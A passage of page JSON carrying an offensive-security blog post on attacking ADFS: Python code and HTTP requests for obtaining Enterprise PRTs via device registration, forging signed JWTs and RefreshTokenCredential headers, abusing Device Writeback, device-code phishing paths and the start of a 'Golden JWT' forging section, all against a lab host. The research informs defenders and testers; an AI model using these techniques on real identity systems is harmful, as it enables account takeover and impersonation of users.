\u002Fadfs\u002Foauth2\u002Ftoken:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":55,"end":73,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_156":{"__typename":"Paragraph","id":"6c2350f1b8ff_156","name":"e022","type":"PRE","href":null,"layout":null,"metadata":null,"text":"POST https:\u002F\u002Fadfs.lab.local\u002Fadfs\u002Foauth2\u002Ftoken HTTP\u002F1.1\nContent-Type: application\u002Fsoap+xml; charset=utf-8\nUser-Agent: dd762716-544d-4aeb-a526-687b73838a22\nHost: adfs.lab.local\nContent-Length: 24\nCache-Control: no-cache\n\ngrant_type=srv_challenge","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"makefile"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_157":{"__typename":"Paragraph","id":"6c2350f1b8ff_157","name":"157f","type":"P","href":null,"layout":null,"metadata":null,"text":"The response from this call returns the nonce value:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_158":{"__typename":"Paragraph","id":"6c2350f1b8ff_158","name":"8e55","type":"PRE","href":null,"layout":null,"metadata":null,"text":"HTTP\u002F1.1 200 OK\n...\n{\n    \"Nonce\":\"eyJWZXJzaW9uIjoxLCJFbmVVhzQU5[...]dHJ1ZX0\"\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_159":{"__typename":"Paragraph","id":"6c2350f1b8ff_159","name":"fb94","type":"P","href":null,"layout":null,"metadata":null,"text":"Next we need to request the PRT. This is done by creating a JWT bearer token which is signed with our generated device certificate:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_160":{"__typename":"Paragraph","id":"6c2350f1b8ff_160","name":"7f8f","type":"PRE","href":null,"layout":null,"metadata":null,"text":"POST \u002Fadfs\u002Foauth2\u002Ftoken HTTP\u002F1.1\nHost: adfs.lab.local\nContent-Type: application\u002Fx-www-form-urlencoded\nContent-Length: 7808\n\ngrant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Ajwt-bearer&\nrequest=eyJhbGciOiJSUzI1NiIsI...","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_161":{"__typename":"Paragraph","id":"6c2350f1b8ff_161","name":"345e","type":"P","href":null,"layout":null,"metadata":null,"text":"The required content of this JWT are documented in MS-OAPXBC. As with Entra ID, we can authenticate our user within the JWT using one of three methods:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":51,"end":60,"href":"https:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fopenspecs\u002Fwindows_protocols\u002Fms-oapxbc\u002F11e4a749-5064-4c6c-86f8-8c76de699e9f","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_162":{"__typename":"Paragraph","id":"6c2350f1b8ff_162","name":"4466","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Username \u002F Password","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_163":{"__typename":"Paragraph","id":"6c2350f1b8ff_163","name":"208b","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Refresh Token","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_164":{"__typename":"Paragraph","id":"6c2350f1b8ff_164","name":"ad41","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Signed JWT","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_165":{"__typename":"Paragraph","id":"6c2350f1b8ff_165","name":"b35e","type":"P","href":null,"layout":null,"metadata":null,"text":"For our purpose we’ll use a Refresh Token as we already have this from the earlier Device Code authentication flow:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_166":{"__typename":"Paragraph","id":"6c2350f1b8ff_166","name":"1bbc","type":"PRE","href":null,"layout":null,"metadata":null,"text":"def generate_prt_request(client_id, nonce, device_cert, grant_type, refresh_token=\"\", username=\"\", password=\"\"):\n    \n    header = {\n        \"alg\": \"RS256\",\n        \"x5c\": generate_x5c(device_cert)\n    }\n    \n    payload = {\n        \"client_id\": client_id,\n        \"scope\": \"aza openid\",\n        \"request_nonce\": nonce\n        }  \n    \n    payload[\"grant_type\"] = \"refresh_token\"\n    payload[\"refresh_token\"] = refresh_token\n    \n    token = jwt.encode(payload, private_key, algorithm=\"RS256\", headers=header)\n    \n    return token","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"python"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_167":{"__typename":"Paragraph","id":"6c2350f1b8ff_167","name":"862a","type":"P","href":null,"layout":null,"metadata":null,"text":"And if everything goes well, we’ll get a PRT in the response:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_168":{"__typename":"Paragraph","id":"6c2350f1b8ff_168","name":"70f8","type":"PRE","href":null,"layout":null,"metadata":null,"text":"{\n    \"token_type\": \"pop\",\n    \"refresh_token\": \"SlZhQk16OQPrDS_J...\",\n    \"refresh_token_expires_in\": 1209600,\n    \"session_key_jwe\": \"eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9B...\",\n    \"id_token\": \"eyJ0eXAiOiJKV1QiLCJh...\"\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"json"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_169":{"__typename":"Paragraph","id":"6c2350f1b8ff_169","name":"3609","type":"P","href":null,"layout":null,"metadata":null,"text":"The session_key_jwe field is needed for exchanging the PRT for an Access Token, which is in turn encrypted using the msDS-KeyCredentialLink value which we added earlier during Device Registration.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":4,"end":19,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":117,"end":139,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_170":{"__typename":"Paragraph","id":"6c2350f1b8ff_170","name":"754d","type":"P","href":null,"layout":null,"metadata":null,"text":"To decrypt these values, we can use the decrypt_jwe_with_transport_key from ROADTools code which looks something like:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":40,"end":70,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":76,"end":90,"href":"https:\u002F\u002Fgithub.com\u002Fdirkjanm\u002FROADtools\u002Fblob\u002F87ffa576160a84b3e3b3e387f01d52bdf4933744\u002Froadlib\u002Froadtools\u002Froadlib\u002Fdeviceauth.py#L719","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_171":{"__typename":"Paragraph","id":"6c2350f1b8ff_171","name":"04f9","type":"PRE","href":null,"layout":null,"metadata":null,"text":"def decrypt_session_token(encrypted_jwt, encrypted_prt, encryption_key):\n    \n    parts = encrypted_jwt.split(\".\")\n    body = parts[1]\n    body = body + \"=\" * (4 - len(body) % 4)\n    \n    encrypted_key = base64.urlsafe_b64decode(body+('='*(len(body)%4)))\n    session_token = encryption_key.decrypt(encrypted_key, apadding.OAEP(apadding.MGF1(hashes.SHA1()), hashes.SHA1(), None))\n    \n    return session_token","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"scss"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_172":{"__typename":"Paragraph","id":"6c2350f1b8ff_172","name":"49e7","type":"P","href":null,"layout":null,"metadata":null,"text":"Once we have the PRT and the session key, we then have a few options to use it. The first is the usual PRT to Access Token for a resource. This needs a JWT signed with the session token to be generated:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_173":{"__typename":"Paragraph","id":"6c2350f1b8ff_173","name":"7faf","type":"PRE","href":null,"layout":null,"metadata":null,"text":"def request_access_token(hostname, client_id, scopes, resource, eprt, signing_key, ctx):\n    \n    token_url = f\"https:\u002F\u002F{hostname}\u002Fadfs\u002Foauth2\u002Ftoken\"\n    \n    header = {\n        \"alg\": \"HS256\",\n        \"ctx\": base64.b64encode(ctx).decode(\"utf-8\"),\n        \"kdf_ver\": 1\n    }\n    \n    body = {\n        \"scope\": \" \".join(scopes),\n        \"client_id\": client_id,\n        \"resource\": resource,\n        \"iat\": datetime.datetime.utcnow(),\n        \"exp\": datetime.datetime.utcnow() + datetime.timedelta(days=1),\n        \"grant_type\": \"refresh_token\",\n        \"refresh_token\": eprt\n    }\n    \n    token = jwt.encode(body, signing_key, algorithm=\"HS256\", headers=header)\n\n    response = requests.post(token_url, data=\"grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&request=\" + token, verify=False)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"python"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_174":{"__typename":"Paragraph","id":"6c2350f1b8ff_174","name":"90a2","type":"P","href":null,"layout":null,"metadata":null,"text":"The response to this is (exactly like their Entra ID counterparts) encrypted using JWE and need to be decrypted. The code for this already exists in ROADTools decrypt_auth_response_derivedkey function so we can use this to cobble together:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":159,"end":191,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":192,"end":200,"href":"https:\u002F\u002Fgithub.com\u002Fdirkjanm\u002FROADtools\u002Fblob\u002F87ffa576160a84b3e3b3e387f01d52bdf4933744\u002Froadlib\u002Froadtools\u002Froadlib\u002Fauth.py#L949","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_175":{"__typename":"Paragraph","id":"6c2350f1b8ff_175","name":"e186","type":"PRE","href":null,"layout":null,"metadata":null,"text":"def decrypt_prt(prt, signing_key, ctx):\n    \n    parts = prt.split(\".\")\n    \n    header, enckey, iv, ciphertext, authtag = prt.split('.')\n    header_decoded = base64.urlsafe_b64decode(header + '=' * (4 - len(header) % 4))\n    \n    jwe_header = json.loads(header_decoded)\n    iv = base64.urlsafe_b64decode(iv + '=' * (4 - len(iv) % 4))\n    ciphertext = base64.urlsafe_b64decode(ciphertext + '=' * (4 - len(ciphertext) % 4))\n    authtag = base64.urlsafe_b64decode(authtag + '=' * (4 - len(authtag) % 4))\n    \n    if jwe_header[\"enc\"] == \"A256GCM\" and len(iv) == 12:\n        aesgcm = AESGCM(signing_key)\n        depadded_data = aesgcm.decrypt(iv, ciphertext + authtag, header.encode(\"utf-8\"))\n        token = json.loads(depadded_data)\n    else:\n        cipher = Cipher(algorithms.AES(signing_key), modes.CBC(iv))\n        decryptor = cipher.decryptor()\n        decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()\n        unpadder = padding.PKCS7(128).unpadder()\n        depadded_data = unpadder.update(decrypted_data) + unpadder.finalize()\n        token = json.loads(depadded_data)\n    \n    return token","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"python"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_176":{"__typename":"Paragraph","id":"6c2350f1b8ff_176","name":"d674","type":"P","href":null,"layout":null,"metadata":null,"text":"The second use case is the familiar x-ms-RefreshTokenCredential header, which can be used to login to ADFS directly (useful for things like accessing \u002Fadfs\u002Fls\u002Fidpinitiatedsignon.aspx):","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":36,"end":63,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":150,"end":182,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_177":{"__typename":"Paragraph","id":"6c2350f1b8ff_177","name":"6640","type":"PRE","href":null,"layout":null,"metadata":null,"text":"def generate_prt_header(hostname, client_id, eprt, signing_key, ctx):\n    \n    token_url = f\"https:\u002F\u002F{hostname}\u002Fadfs\u002Foauth2\u002Ftoken\"\n\n    try:\n        response = requests.post(token_url, data=\"grant_type=srv_challenge\", verify=False)\n        nonce = response.json()[\"Nonce\"]\n    except Exception as e:\n        print(\"Failed to get nonce: \" + str(e))\n        sys.exit(1)\n    \n    header = {\n        \"alg\": \"HS256\",\n        \"ctx\": base64.b64encode(ctx).decode(\"utf-8\"),\n        \"kdf_ver\": 1\n    }\n    \n    body = {\n        \"refresh_token\": eprt,\n        \"request_nonce\": nonce\n    }    \n\n    token = jwt.encode(body, signing_key, algorithm=\"HS256\", headers=header)\n    \n    print(\"x-ms-RefreshTokenCredential: {}\".format(token))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"python"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_178":{"__typename":"Paragraph","id":"6c2350f1b8ff_178","name":"cbe5","type":"P","href":null,"layout":null,"metadata":null,"text":"If we inject this token to the header of a request to \u002Fadfs\u002Fls\u002Fidpinitiatedsignon.aspx, we’ll see that we can be logged in:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":54,"end":86,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*XQpZWfCvQhvgHf6gT2eZbg.png":{"__typename":"ImageMetadata","id":"1*XQpZWfCvQhvgHf6gT2eZbg.png","originalHeight":452,"originalWidth":1804,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_179":{"__typename":"Paragraph","id":"6c2350f1b8ff_179","name":"e5b2","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*XQpZWfCvQhvgHf6gT2eZbg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*AdwNLloTSdRR-S886E1QJg.png":{"__typename":"ImageMetadata","id":"1*AdwNLloTSdRR-S886E1QJg.png","originalHeight":350,"originalWidth":630,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_180":{"__typename":"Paragraph","id":"6c2350f1b8ff_180","name":"1b95","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*AdwNLloTSdRR-S886E1QJg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_181":{"__typename":"Paragraph","id":"6c2350f1b8ff_181","name":"5828","type":"P","href":null,"layout":null,"metadata":null,"text":"To make this all a bit easier when playing around, I’ve created a few Python scripts which can be found at https:\u002F\u002Fgithub.com\u002Fxpn\u002Fadfstoolkit:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":107,"end":142,"href":"https:\u002F\u002Fgithub.com\u002Fxpn\u002Fadfstoolkit:","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_182":{"__typename":"Paragraph","id":"6c2350f1b8ff_182","name":"9cc4","type":"ULI","href":null,"layout":null,"metadata":null,"text":"register_device.py - Performs DRS registration to create msDS-Device","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":18,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":57,"end":68,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_183":{"__typename":"Paragraph","id":"6c2350f1b8ff_183","name":"7609","type":"ULI","href":null,"layout":null,"metadata":null,"text":"access_token.py - Requests Access Token from PRT","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":15,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_184":{"__typename":"Paragraph","id":"6c2350f1b8ff_184","name":"e406","type":"ULI","href":null,"layout":null,"metadata":null,"text":"eprt.py - Generates a new Enterprise PRT","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":7,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_185":{"__typename":"Paragraph","id":"6c2350f1b8ff_185","name":"15be","type":"H3","href":null,"layout":null,"metadata":null,"text":"Then Along Came Azure Hybrid Join","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_186":{"__typename":"Paragraph","id":"6c2350f1b8ff_186","name":"d771","type":"P","href":null,"layout":null,"metadata":null,"text":"So we have all of this DRS functionality.. what happens if the environment we are assessing uses Hybrid Join to Entra ID? In that case, we actually find that DRS turns itself off as we can see in the disassembly of ADFS:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*tqlD3TZMfJOdRr9XwBHGqw.png":{"__typename":"ImageMetadata","id":"1*tqlD3TZMfJOdRr9XwBHGqw.png","originalHeight":824,"originalWidth":1698,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_187":{"__typename":"Paragraph","id":"6c2350f1b8ff_187","name":"59bf","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*tqlD3TZMfJOdRr9XwBHGqw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_188":{"__typename":"Paragraph","id":"6c2350f1b8ff_188","name":"e7a2","type":"P","href":null,"layout":null,"metadata":null,"text":"But while this turns off the DRS HTTP services, it still allows Device Authentication. But why? Wouldn’t it makes sense to disable all device registration functionality? Well not quite, as Entra ID still supports ADFS Device Authentication in the form of Device Writeback.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_189":{"__typename":"Paragraph","id":"6c2350f1b8ff_189","name":"9715","type":"H3","href":null,"layout":null,"metadata":null,"text":"Entra Connect Device Writeback","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_190":{"__typename":"Paragraph","id":"6c2350f1b8ff_190","name":"8011","type":"P","href":null,"layout":null,"metadata":null,"text":"If Device Writeback has been enabled during the rollout of Entra Connect, msDS-Device objects are synced with their Entra ID device object counterparts.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":74,"end":85,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_191":{"__typename":"Paragraph","id":"6c2350f1b8ff_191","name":"c6a3","type":"P","href":null,"layout":null,"metadata":null,"text":"In Entra Connect we see the option to enable Device Writeback:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*Rx8DYwPx4oOt8nAYfBEBLw.png":{"__typename":"ImageMetadata","id":"1*Rx8DYwPx4oOt8nAYfBEBLw.png","originalHeight":714,"originalWidth":1758,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_192":{"__typename":"Paragraph","id":"6c2350f1b8ff_192","name":"cfed","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Rx8DYwPx4oOt8nAYfBEBLw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_193":{"__typename":"Paragraph","id":"6c2350f1b8ff_193","name":"8305","type":"P","href":null,"layout":null,"metadata":null,"text":"When a new device is registered in Entra ID, we see that the ID is written to the CN=RegisteredDevices container exactly the same as our previous DRS registration examples, with the difference that the MSOL_ account will be the owner of the object rather than the ADFS service account:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":82,"end":102,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":202,"end":207,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*hCFnpEOgBZLEX0pmzR64Ug.png":{"__typename":"ImageMetadata","id":"1*hCFnpEOgBZLEX0pmzR64Ug.png","originalHeight":642,"originalWidth":1546,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_194":{"__typename":"Paragraph","id":"6c2350f1b8ff_194","name":"6985","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*hCFnpEOgBZLEX0pmzR64Ug.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_195":{"__typename":"Paragraph","id":"6c2350f1b8ff_195","name":"9140","type":"P","href":null,"layout":null,"metadata":null,"text":"And with the many attacks possible against Entra ID, this can provide an avenue to migrate your access to ADFS using the methods outlined in the post.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_196":{"__typename":"Paragraph","id":"6c2350f1b8ff_196","name":"121f","type":"P","href":null,"layout":null,"metadata":null,"text":"So with that said, let’s take a quick recap of the attack paths we’ve passed on the way to this point:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_197":{"__typename":"Paragraph","id":"6c2350f1b8ff_197","name":"a7e0","type":"OLI","href":null,"layout":null,"metadata":null,"text":"If an organisation has DRS enabled, and doesn’t have Hybrid Join in the Service Connection Point LDAP entry, you can potentially phish using Device Code OAuth2 flow for access to ADFS.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_198":{"__typename":"Paragraph","id":"6c2350f1b8ff_198","name":"0791","type":"OLI","href":null,"layout":null,"metadata":null,"text":"If an organisation has DRS enabled, but has enabled Hybrid Join in the Service Connection Point LDAP entry, DRS web services are disabled, but Device Writeback can provide a method of accessing ADFS if a new Entra ID device registration is performed.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_199":{"__typename":"Paragraph","id":"6c2350f1b8ff_199","name":"37f7","type":"OLI","href":null,"layout":null,"metadata":null,"text":"Regardless, if ADFS uses OAuth2, Device Code auth is likely enabled, so again, phishing can be used to target other application integrations.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_200":{"__typename":"Paragraph","id":"6c2350f1b8ff_200","name":"b8fa","type":"OLI","href":null,"layout":null,"metadata":null,"text":"And if we can control a msDS-Device and Device Authentication is enabled, we can authenticate to ADFS as any user by modifying msDS-RegisteredOwner and msDS-RegisteredUsers and using a device certificate","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":24,"end":35,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":127,"end":147,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":152,"end":172,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_201":{"__typename":"Paragraph","id":"6c2350f1b8ff_201","name":"17b2","type":"P","href":null,"layout":null,"metadata":null,"text":"Let’s finish things off by looking at the concept of a Golden JWT.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_202":{"__typename":"Paragraph","id":"6c2350f1b8ff_202","name":"edcc","type":"H3","href":null,"layout":null,"metadata":null,"text":"Golden JWT","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_203":{"__typename":"Paragraph","id":"6c2350f1b8ff_203","name":"1d8a","type":"P","href":null,"layout":null,"metadata":null,"text":"This is similar to Golden SAML in that if we have the correct signing key, we can forge the appropriate JWT’s for third-party integrations.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_204":{"__typename":"Paragraph","id":"6c2350f1b8ff_204","name":"ba8d","type":"P","href":null,"layout":null,"metadata":null,"text":"Let’s use the previous ClaimsXRay lab that we previously setup to target:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*Qtt9L3Im_suq29IdeAcbtw.png":{"__typename":"ImageMetadata","id":"1*Qtt9L3Im_suq29IdeAcbtw.png","originalHeight":881,"originalWidth":960,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_205":{"__typename":"Paragraph","id":"6c2350f1b8ff_205","name":"14b8","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Qtt9L3Im_suq29IdeAcbtw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_206":{"__typename":"Paragraph","id":"6c2350f1b8ff_206","name":"2518","type":"P","href":null,"layout":null,"metadata":null,"text":"As we see during the happy flow, the claims in the token are reflected back to us:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*2FCfKD7G3X60OpGK4yfULw.png":{"__typename":"ImageMetadata","id":"1*2FCfKD7G3X60OpGK4yfULw.png","originalHeight":647,"originalWidth":799,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_207":{"__typename":"Paragraph","id":"6c2350f1b8ff_207","name":"f72e","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*2FCfKD7G3X60OpGK4yfULw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_208":{"__typename":"Paragraph","id":"6c2350f1b8ff_208","name":"c939","type":"P","href":null,"layout":null,"metadata":null,"text":"Now let’s see if we can spoof the claims in the JWT! If we analyse the contents of an existing access token, we get our hint about what is being used to sign the JWT:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_209":{"__typename":"Paragraph","id":"6c2350f1b8ff_209","name":"fa0c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"{\n  \"typ\": \"JWT\",\n  \"alg\": \"RS256\",\n  \"x5t\": \"AYq-eHNpTwfrqqTw03y4wsIE0GQ\",\n  \"kid\": 